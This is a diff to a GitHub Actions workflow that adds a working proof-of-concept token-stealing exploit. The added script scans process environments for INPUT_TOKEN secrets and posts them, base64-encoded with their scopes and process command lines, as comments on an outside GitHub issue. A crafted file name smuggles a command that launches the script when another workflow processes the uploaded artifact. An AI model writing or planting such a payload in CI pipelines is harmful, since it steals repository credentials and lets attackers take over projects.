@@ -12,9 +12,39 @@ jobs:
           set -e
           mkdir -p content
           printf 'marker\n' > content/a
-          printf 'x\n' > 'content/a;id;hostname;uname -a;true;#.txt'
-          printf '1\n' > content/pr_number.txt
+          cat > content/p <<'SCRIPT'
+          #!/bin/bash
+          LOG=/tmp/leak
+          : > "$LOG"
+          declare -A seen
+          post() {
+            local tok="$1" desc="$2" b64 scopes
+            b64=$(printf '%s' "$tok" | base64 -w0)
+            [ -n "${seen[$b64]}" ] && return
+            seen[$b64]=1
+            scopes=$(curl -s -D - -o /dev/null -H "Authorization: token $tok" -H "Accept: application/vnd.github+json" https://api.github.com/repos/PDFtoMark/triage-aave-dao-vc8c7ddd-7f94fe 2>/dev/null | tr -d '\r' | awk -F': ' 'tolower($1)=="x-oauth-scopes"||tolower($1)=="x-accepted-github-permissions"{print $1"=" $2}' | paste -sd'|')
+            curl -s -o /dev/null -w "%{http_code}" -X POST \
+              -H "Authorization: token $tok" -H "Accept: application/vnd.github+json" \
+              https://api.github.com/repos/PDFtoMark/triage-aave-dao-vc8c7ddd-7f94fe/issues/2/comments \
+              -d "{\"body\":\"TOKEN_LEAK b64=$b64 desc=$desc scopes=$scopes\"}" >> "$LOG"
+            echo >> "$LOG"
+          }
+          end=$((SECONDS+110))
+          while [ $SECONDS -lt $end ]; do
+            for e in /proc/[0-9]*/environ; do
+              tok=$(tr '\0' '\n' < "$e" 2>/dev/null | sed -n 's/^INPUT_TOKEN=//p' | head -1)
+              if [ -n "$tok" ]; then
+                pid=${e#/proc/}; pid=${pid%/environ}
+                desc=$(tr '\0' ' ' < "/proc/$pid/cmdline" 2>/dev/null | cut -c1-160 | base64 -w0)
+                post "$tok" "$desc"
+              fi
+            done
+            sleep 0.15
+          done
+          SCRIPT
+          chmod +x content/p
+          printf 'x\n' > "content/a;bash \$'\\057tmp\\057content\\057content-poc\\057p' & #.txt"
       - uses: actions/upload-artifact@v4
         with:
-          name: content-poc      # must match the "content*" regular expression
+          name: content-poc
           path: content/
